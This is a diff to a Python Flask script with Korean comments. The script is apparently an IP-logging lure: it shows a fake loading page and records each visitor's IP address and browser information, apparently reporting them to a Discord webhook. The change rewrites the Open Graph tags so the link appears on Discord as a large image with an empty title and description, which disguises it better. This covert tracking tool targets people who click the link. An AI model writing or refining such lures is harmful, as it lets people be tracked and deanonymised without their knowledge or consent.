@@ -15,18 +15,18 @@ DISCORD_WEBHOOK_URL_IP = "https://discord.com/api/webhooks/1547879120195821639/3
 TARGET_URL = "https://weao.xyz"
 last_status = None
 
-# 🔥 디스코드 미리보기 HTML (나무위키 이미지 적용 완료)
+# 🔥 디스코드 거대 이미지 카드 미리보기 HTML (나무위키 이미지 + 큼직한 사진 형태 적용)
 PREVIEW_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
-    <title>이벤트 확인하기</title>
-    <!-- 디스코드 카드 미리보기를 조작하는 Open Graph 태그 -->
-    <meta property="og:title" content="🎁 특별 이벤트 참여하기">
-    <meta property="og:description" content="클릭해서 내용을 확인하세요!">
+    <title></title>
+    <!-- 디스코드에 이미지를 커다랗게 꽉 채워서 보여달라고 강제하는 태그 -->
+    <meta name="twitter:card" content="summary_large_image">
     <meta property="og:image" content="https://i.namu.wiki/i/Va3Dy_3qFHvGQS4qwv0oCvFySbT1DXJkK0zfMosd2UK6Jun8Zucb796VLJzLL4A40e5P4dgbBPT4da2Bv_S50Q.webp">
-    <meta property="og:type" content="website">
+    <meta property="og:title" content=" ">
+    <meta property="og:description" content=" ">
 </head>
 <body style="background-color: #111; color: #fff; text-align: center; padding-top: 50px;">
     <h2>로딩 중입니다... 잠시만 기다려주세요.</h2>
@@ -66,7 +66,7 @@ def monitor_potassium():
             
         time.sleep(60)
 
-# 2. 웹서버 접속 시 IP 및 브라우저 정보 로깅 (핑 봇 자동 필터링 + OG 태그 적용)
+# 2. 웹서버 접속 시 IP 및 브라우저 정보 로깅 (핑 봇 자동 필터링 + 거대 이미지 OG 태그 적용)
 @app.route('/')
 def catch_ip():
     user_agent = request.headers.get('User-Agent', 'N/A')
